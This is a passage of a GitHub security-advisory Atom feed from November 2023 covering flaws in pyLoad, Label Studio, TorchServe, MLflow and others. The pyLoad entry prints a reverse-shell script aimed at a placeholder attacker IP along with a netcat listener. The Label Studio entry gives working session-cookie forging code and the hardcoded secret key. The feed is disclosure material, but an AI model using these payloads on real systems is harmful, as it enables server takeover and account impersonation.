        <link href="https://github.com/advisories/GHSA-qf3c-rw9f-jh7v"/>
        <updated>2023-11-22T18:08:06.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>When credentials are provided while creating an OnboardingTask they may be visible via the Job Results view under the Additional Data tab as args for the Celery Task execution. This only applies to OnboardingTasks that are created with credentials specified while on v2.0.0-2.0.2 of Nautobot Device Onboarding. This advisory does not apply earlier version or when using NAPALM_USERNAME &amp; NAPALM_PASSWORD from nautobot_config.py</p>
<h3 id="patches">Patches</h3>
<p>v3.0.0</p>
<h3 id="workarounds">Workarounds</h3>
<p>None</p>
<h3 id="recommendations">Recommendations</h3>
<ul>
<li>Delete all Job Results for any onboarding task to remove clear text credentials from database entries that were run while on v2.0.X</li>
<li>Upgrade to v3.0.0</li>
<li>Rotate any exposed credential</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nautobot/nautobot-plugin-device-onboarding/security/advisories/GHSA-qf3c-rw9f-jh7v">https://github.com/nautobot/nautobot-plugin-device-onboarding/security/advisories/GHSA-qf3c-rw9f-jh7v</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-48700">https://nvd.nist.gov/vuln/detail/CVE-2023-48700</a></li>
<li><a href="https://github.com/advisories/GHSA-qf3c-rw9f-jh7v">https://github.com/advisories/GHSA-qf3c-rw9f-jh7v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qf3c-rw9f-jh7v</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-11-21T23:50:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pyload-ng] Download to arbitrary folder can lead to RCE]]></title>
        <id>https://github.com/advisories/GHSA-h73m-pcfw-25h2</id>
        <link href="https://github.com/advisories/GHSA-h73m-pcfw-25h2"/>
        <updated>2023-11-21T22:19:12.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A web UI user can store files anywhere on the pyLoad server and gain command execution by abusing scripts.</p>
<h3 id="details">Details</h3>
<p>When a user creates a new package, a subdirectory is created within the /downloads folder to store files. This new directory name is derived from the package name, except a filter is applied to make sure it can't traverse directories and stays within /downloads.</p>
<p>src/pyload/core/api/<strong>init</strong>.py::add_package::L432</p>
<pre><code class="language-python">  folder = (
      folder.replace("http://", "")
      .replace("https://", "")
      .replace(":", "")
      .replace("/", "_")
      .replace("\\", "_")
  )
</code></pre>
<p>So if a package were created with the name <code>"../"</code> the application would instead create the folder <code>"/downloads/.._/"</code></p>
<p>However, when editing packages there is no prevention in place and a user can just pick any arbitrary directory in the filesystem.</p>
<p>src/pyload/webui/app/blueprints/json_blueprint.py::edit_package::L195</p>
<pre><code class="language-python">  id = int(flask.request.form["pack_id"])
  data = {
      "name": flask.request.form["pack_name"],
      "_folder": flask.request.form["pack_folder"],
      "password": flask.request.form["pack_pws"],
  }

  api.set_package_data(id, data)
</code></pre>
<h3 id="steps-to-reproduce">Steps to reproduce</h3>
<ol>
<li>Login to a pyLoad instance</li>
<li>Go to "Queue" and create a new package with any name and a valid link</li>
<li>Click "Edit Package" on the newly created package and set the folder as "/config/scripts/download_finished/"</li>
<li>Restart the package </li>
<li>Check the server filesystem and note the link was downloaded and stored inside "/config/scripts/download_finished/"</li>
</ol>
<h3 id="remote-code-execution-proof-of-concept">Remote code execution proof-of-concept</h3>
<p>It is possible to use this issue to abuse scripts and gain remote control over the pyLoad server.</p>
<h4 id="on-attacker-machine">On attacker machine</h4>
<ol>
<li>Start a web server hosting a malicious script</li>
</ol>
<pre><code class="language-bash">echo -e '#!/bin/bash\nbash -i &gt;&amp; /dev/tcp/&lt;attacker_ip&gt;/9999 0&gt;&amp;1' &gt; evil.sh&amp;1
sudo python3 -m http.server 80
</code></pre>
<ol start="2">
<li>Start netcat listener for reverse shells</li>
</ol>
<pre><code class="language-bash">nc -vklp 9999
</code></pre>
<h4 id="on-pyload">On pyLoad</h4>
<ol>
<li><p>Change pyLoad file permission settings</p>
<p> Change permissions of downloads: On
 Permission mode for downloaded files: 0744</p>
</li>
<li><p>Create a package with link pointing to the attacker</p>
<p> http:///evil.sh</p>
</li>
<li><p>Edit package and change folder to /config/scripts/package_deleted/</p>
</li>
<li><p>Refresh package. Wait up to 60 seconds for scripts to be processed by pyLoad</p>
</li>
<li><p>Delete any package package to trigger the script</p>
</li>
</ol>
<h3 id="impact">Impact</h3>
<p>An authenticated user can gain control over the underlying pyLoad server.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/pyload/pyload/security/advisories/GHSA-h73m-pcfw-25h2">https://github.com/pyload/pyload/security/advisories/GHSA-h73m-pcfw-25h2</a></li>
<li><a href="https://github.com/pyload/pyload/commit/695bb70cd88608dc4fee18a6a7ecb66722ebfd8f">https://github.com/pyload/pyload/commit/695bb70cd88608dc4fee18a6a7ecb66722ebfd8f</a></li>
<li><a href="https://github.com/advisories/GHSA-h73m-pcfw-25h2">https://github.com/advisories/GHSA-h73m-pcfw-25h2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-h73m-pcfw-25h2</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-11-21T22:19:10.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[fastbots] Eval Injection in fastbots]]></title>
        <id>https://github.com/advisories/GHSA-vccg-f4gp-45x9</id>
        <link href="https://github.com/advisories/GHSA-vccg-f4gp-45x9"/>
        <updated>2023-11-22T18:08:02.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>An attacker could modify the locators.ini locator file with python code that without proper validation it's executed and it could lead to rce. The vulnerability is in the function def <strong>locator</strong>(self, locator_name: str) in page.py. The vulnerable code that load and execute directly from the file without validation it's:</p>
<pre><code class="language-python"> return eval(self._bot.locator(self._page_name, locator_name))
</code></pre>
<h3 id="patches">Patches</h3>
<p>In order to mitigate this issue it's important to upgrade to fastbots version 0.1.5 or above. </p>
<h3 id="references">References</h3>
<p><a href="https://github.com/ubertidavide/fastbots/pull/3#issue-2003080806">Merge that fix also this issue</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/ubertidavide/fastbots/security/advisories/GHSA-vccg-f4gp-45x9">https://github.com/ubertidavide/fastbots/security/advisories/GHSA-vccg-f4gp-45x9</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-48699">https://nvd.nist.gov/vuln/detail/CVE-2023-48699</a></li>
<li><a href="https://github.com/ubertidavide/fastbots/pull/3#issue-2003080806">https://github.com/ubertidavide/fastbots/pull/3#issue-2003080806</a></li>
<li><a href="https://github.com/ubertidavide/fastbots/commit/73eb03bd75365e112b39877e26ef52853f5e9f57">https://github.com/ubertidavide/fastbots/commit/73eb03bd75365e112b39877e26ef52853f5e9f57</a></li>
<li><a href="https://github.com/advisories/GHSA-vccg-f4gp-45x9">https://github.com/advisories/GHSA-vccg-f4gp-45x9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vccg-f4gp-45x9</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-11-21T22:18:22.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[commondatamodel-objectmodel] Microsoft Common Data Model SDK Denial of Service Vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-vm2m-7hpw-fpmq</id>
        <link href="https://github.com/advisories/GHSA-vm2m-7hpw-fpmq"/>
        <updated>2023-11-21T18:29:10.000Z</updated>
        <content type="html"><![CDATA[<p>Microsoft Common Data Model SDK Denial of Service Vulnerability</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-36566">https://nvd.nist.gov/vuln/detail/CVE-2023-36566</a></li>
<li><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36566">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36566</a></li>
<li><a href="https://github.com/advisories/GHSA-vm2m-7hpw-fpmq">https://github.com/advisories/GHSA-vm2m-7hpw-fpmq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vm2m-7hpw-fpmq</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-10-10T18:31:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[torchserve] TorchServe ZipSlip]]></title>
        <id>https://github.com/advisories/GHSA-m2mj-pr4f-h9jp</id>
        <link href="https://github.com/advisories/GHSA-m2mj-pr4f-h9jp"/>
        <updated>2023-11-21T21:33:50.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Using the model/workflow management API, there is a chance of uploading potentially harmful archives that contain files that are extracted to any location on the filesystem that is within the process permissions. Leveraging this issue could aid third-party actors in hiding harmful code in open-source/public models, which can be downloaded from the internet, and take advantage of machines running Torchserve.</p>
<h3 id="patches">Patches</h3>
<p>The ZipSlip issue in TorchServe has been fixed by validating the paths of files contained within a zip archive before extracting them: <a href="https://github.com/pytorch/serve/pull/2634">https://github.com/pytorch/serve/pull/2634</a></p>
<p>TorchServe release 0.9.0 includes fixes to address the ZipSlip vulnerability:
<a href="https://github.com/pytorch/serve/releases/tag/v0.9.0">https://github.com/pytorch/serve/releases/tag/v0.9.0</a></p>
<h3 id="references">References</h3>
<p><a href="https://github.com/pytorch/serve/pull/2634">https://github.com/pytorch/serve/pull/2634</a>
<a href="https://github.com/pytorch/serve/releases/tag/v0.9.0">https://github.com/pytorch/serve/releases/tag/v0.9.0</a></p>
<h3 id="credit">Credit</h3>
<p>We would like to thank Oligo Security for responsibly disclosing this issue.</p>
<p>If you have any questions or comments about this advisory, we ask that you contact AWS Security via our <a href="https://aws.amazon.com/security/vulnerability-reporting">vulnerability reporting page</a> or directly via email to <a href="mailto:aws-security@amazon.com">aws-security@amazon.com</a>. Please do not create a public GitHub issue.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/pytorch/serve/security/advisories/GHSA-m2mj-pr4f-h9jp">https://github.com/pytorch/serve/security/advisories/GHSA-m2mj-pr4f-h9jp</a></li>
<li><a href="https://github.com/pytorch/serve/pull/2634">https://github.com/pytorch/serve/pull/2634</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-48299">https://nvd.nist.gov/vuln/detail/CVE-2023-48299</a></li>
<li><a href="https://github.com/pytorch/serve/commit/bfb3d42396727614aef625143b4381e64142f9bb">https://github.com/pytorch/serve/commit/bfb3d42396727614aef625143b4381e64142f9bb</a></li>
<li><a href="https://github.com/pytorch/serve/releases/tag/v0.9.0">https://github.com/pytorch/serve/releases/tag/v0.9.0</a></li>
<li><a href="https://github.com/advisories/GHSA-m2mj-pr4f-h9jp">https://github.com/advisories/GHSA-m2mj-pr4f-h9jp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m2mj-pr4f-h9jp</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-11-21T01:40:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[apache-submarine] Deserialization of Untrusted Data in apache-submarine]]></title>
        <id>https://github.com/advisories/GHSA-8hcr-5x2g-9f7j</id>
        <link href="https://github.com/advisories/GHSA-8hcr-5x2g-9f7j"/>
        <updated>2023-11-20T23:26:48.000Z</updated>
        <content type="html"><![CDATA[<p>Apache Software Foundation Apache Submarine has a bug when serializing against yaml. The bug is caused by snakeyaml  <a href="https://nvd.nist.gov/vuln/detail/CVE-2022-1471">https://nvd.nist.gov/vuln/detail/CVE-2022-1471</a> .</p>
<p>Apache Submarine uses JAXRS to define REST endpoints.  In order to
handle YAML requests (using application/yaml content-type), it defines
a YamlEntityProvider entity provider that will process all incoming
YAML requests.  In order to unmarshal the request, the readFrom method
is invoked, passing the entityStream containing the user-supplied data in <code>submarine-server/server-core/src/main/java/org/apache/submarine/server/utils/YamlUtils.java</code>.</p>
<p>We have now fixed this issue in the new version by replacing to <code>jackson-dataformat-yaml</code>.
This issue affects Apache Submarine: from 0.7.0 before 0.8.0.&nbsp;Users are recommended to upgrade to version 0.8.0, which fixes this issue.
If using the version smaller than 0.8.0  and not want to upgrade, you can try cherry-pick PR  <a href="https://github.com/apache/submarine/pull/1054">https://github.com/apache/submarine/pull/1054</a>  and rebuild the submart-server image to fix this.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-46302">https://nvd.nist.gov/vuln/detail/CVE-2023-46302</a></li>
<li><a href="https://github.com/apache/submarine/pull/1054">https://github.com/apache/submarine/pull/1054</a></li>
<li><a href="https://issues.apache.org/jira/browse/SUBMARINE-1371">https://issues.apache.org/jira/browse/SUBMARINE-1371</a></li>
<li><a href="https://lists.apache.org/thread/zf0wppzh239j4h131hm1dbswfnztxrr5">https://lists.apache.org/thread/zf0wppzh239j4h131hm1dbswfnztxrr5</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/apache-submarine/PYSEC-2023-240.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/apache-submarine/PYSEC-2023-240.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-8hcr-5x2g-9f7j">https://github.com/advisories/GHSA-8hcr-5x2g-9f7j</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8hcr-5x2g-9f7j</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-11-20T09:30:31.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[label-studio] Label Studio has Hardcoded Django `SECRET_KEY` that can be Abused to Forge Session Tokens]]></title>
        <id>https://github.com/advisories/GHSA-f475-x83m-rx5m</id>
        <link href="https://github.com/advisories/GHSA-f475-x83m-rx5m"/>
        <updated>2023-11-20T20:49:35.000Z</updated>
        <content type="html"><![CDATA[<h1 id="introduction">Introduction</h1>
<p>This write-up describes a vulnerability found in <a href="https://github.com/HumanSignal/label-studio">Label Studio</a>, a popular open source data labeling tool. The vulnerability was found to affect versions before <code>1.8.2</code>, where a patch was introduced.</p>
<h1 id="overview">Overview</h1>
<p>In <a href="https://github.com/HumanSignal/label-studio/tree/1.8.1">Label Studio version 1.8.1</a>, a hard coded Django <code>SECRET_KEY</code> was set in the application settings. The Django <code>SECRET_KEY</code> is used for signing session tokens by the web application framework, and should never be shared with unauthorised parties.</p>
<p>However, the Django framework inserts a <code>_auth_user_hash</code> claim in the session token that is a HMAC hash of the account's password hash. That claim would normally prevent forging a valid Django session token without knowing the password hash of the account. However, any authenticated user can exploit an Object Relational Mapper (ORM) Leak vulnerability in Label Studio to leak the password hash of any account on the platform, which is reported as a separate vulnerability. An attacker can exploit the ORM Leak vulnerability (which was patched in <a href="https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0"><code>1.9.2post0</code></a>) and forge session tokens for all users on Label Studio using the hard coded <code>SECRET_KEY</code>.</p>
<h1 id="description">Description</h1>
<p>Below is the code snippet of the Django settings file at <a href="https://github.com/HumanSignal/label-studio/blob/1.8.1/label_studio/core/settings/base.py#L108"><code>label_studio/core/settings/base.py</code></a>.</p>
<pre><code class="language-python"># SECURITY WARNING: keep the secret key used in production secret!
SECRET_KEY = '$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n'
</code></pre>
<p>This secret is hard coded across all instances of Label Studio.</p>
<h1 id="proof-of-concept">Proof of Concept</h1>
<p>Below are the steps that an attacker could do to forge a session token of any account on Label Studio:</p>
<ol>
<li><p>Exploit the ORM Leak vulnerability (patched in <a href="https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0"><code>1.9.2post0</code></a>) in Label Studio to retrieve the full password hash that will be impersonated. For this example, a session token will be forged for an account with the email <code>ghostccamm@testvm.local</code> with the password hash <code>pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=</code> that was retrieved.</p>
</li>
<li><p>Create a new Django project with an empty application. In <code>cookieforge/cookieforge/settings.py</code> set the <code>SECRET_KEY</code> to <code>$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n</code>. Create a management command with the following code that will be used to create forged session tokens.</p>
</li>
</ol>
<pre><code class="language-python">from typing import Any
from django.core.management.base import  BaseCommand, CommandParser
from django.core import signing
from django.utils.crypto import salted_hmac
from django.conf import settings
import time, uuid

class Command(BaseCommand):
    help = "Forge a users session cookie on Label Studio"

    def add_arguments(self, parser: CommandParser) -&gt; None:
        parser.add_argument(
            '-o', '--organisation',
            help='Organisation ID to access',
            default=1,
            type=int
        )

        parser.add_argument(
            'user_id',
            help='The User ID of the victim you want to impersonate',
            type=str
        )

        parser.add_argument(
            'user_hash',
            help='The password hash the user you want to impersonate'
        )

    def handle(self, *args: Any, **options: Any) -&gt; str | None:
        key = settings.SECRET_KEY
        # Creates the _auth_user_hash HMAC of the victim's password hash
        auth_user_hash = salted_hmac(
            'django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash',
            options['user_hash'],
            secret=key,
            algorithm="sha256"
        ).hexdigest()

        session_dict = {
            'uid': str(uuid.uuid4()), 
            'organization_pk': options['organisation'], 
            'next_page': '/projects/', 
            'last_login': time.time(), 
            '_auth_user_id': options['user_id'], 
            '_auth_user_backend': 
            'django.contrib.auth.backends.ModelBackend', 
            '_auth_user_hash': auth_user_hash, 
            'keep_me_logged_in': True, 
            '_session_expiry': 600
        }

        # Creates a forged session token
        session_token = signing.dumps(
            session_dict,
            key=key,
            salt="django.contrib.sessions.backends.signed_cookies",
            compress=True
        )

        self.stdout.write(
            self.style.SUCCESS(f"session token: {session_token}")
        )
</code></pre>
<ol start="3">
<li>Next run the following command replacing the <code>{user_id}</code> with the user ID of the account you want to the impersonate and <code>{user_hash}</code> with the victim's password hash. Copy the session token that is printed.</li>
</ol>
<pre><code class="language-python">python3 manage.py forgecookie {user_id} '{user_hash}'
</code></pre>
<ol start="4">
<li>Change the <code>sessionid</code> cookie on the browser and refresh the page. Observe being authenticated as the victim user.</li>
</ol>
<h1 id="impact">Impact</h1>
<p>This vulnerability can be chained with the ORM Leak vulnerability (which was patched in <a href="https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0"><code>1.9.2post0</code></a>) in Label Studio to impersonate any account on Label Studio. An attacker could exploit these vulnerabilities to escalate their privileges from a low privilege user to a Django Super Administrator user.</p>
<h1 id="remediation-advice">Remediation Advice</h1>
<p>It is important to note that the hard coded <code>SECRET_KEY</code> has already been removed in Label Studio versions <code>&gt;=1.8.2</code>. However, there has not been any public disclosure about the use of the hard coded secret key and users have not been informed about the security vulnerability.</p>
<p>We recommend that Human Signal to release a public disclosure about the hard coded <code>SECRET_KEY</code> to encourage users to patch to a version <code>&gt;=1.8.2</code> to mitigate the likelihood of an attacker exploiting these vulnerabilities to impersonate all accounts on the platform.</p>
<h1 id="discovered">Discovered</h1>
<ul>
<li>August 2023, Robert Schuh, @robbilie</li>
<li>August 2023, Alex Brown, elttam</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/HumanSignal/label-studio/security/advisories/GHSA-f475-x83m-rx5m">https://github.com/HumanSignal/label-studio/security/advisories/GHSA-f475-x83m-rx5m</a></li>
<li><a href="https://github.com/HumanSignal/label-studio/pull/4690">https://github.com/HumanSignal/label-studio/pull/4690</a></li>
<li><a href="https://github.com/HumanSignal/label-studio/commit/3d06c5131c15600621e08b06f07d976887cde81b">https://github.com/HumanSignal/label-studio/commit/3d06c5131c15600621e08b06f07d976887cde81b</a></li>
<li><a href="https://github.com/HumanSignal/label-studio/releases/tag/1.8.2">https://github.com/HumanSignal/label-studio/releases/tag/1.8.2</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-43791">https://nvd.nist.gov/vuln/detail/CVE-2023-43791</a></li>
<li><a href="https://github.com/advisories/GHSA-f475-x83m-rx5m">https://github.com/advisories/GHSA-f475-x83m-rx5m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-f475-x83m-rx5m</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2023-11-09T14:42:58.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mlflow] MLflow authentication requirement bypass can allow a user to arbitrarily create an account]]></title>
        <id>https://github.com/advisories/GHSA-4qq5-mxxx-m6gg</id>
        <link href="https://github.com/advisories/GHSA-4qq5-mxxx-m6gg"/>
        <updated>2023-11-20T16:48:03.000Z</updated>
        <content type="html"><![CDATA[<p>An attacker is able to arbitrarily create an account in MLflow bypassing any authentication requirement.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-6014">https://nvd.nist.gov/vuln/detail/CVE-2023-6014</a></li>
<li><a href="https://huntr.com/bounties/3e64df69-ddc2-463e-9809-d07c24dc1de4">https://huntr.com/bounties/3e64df69-ddc2-463e-9809-d07c24dc1de4</a></li>
<li><a href="https://github.com/mlflow/mlflow/issues/9669">https://github.com/mlflow/mlflow/issues/9669</a></li>
<li><a href="https://github.com/advisories/GHSA-4qq5-mxxx-m6gg">https://github.com/advisories/GHSA-4qq5-mxxx-m6gg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4qq5-mxxx-m6gg</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2023-11-16T21:30:46.000Z</published>
    </entry>
</feed>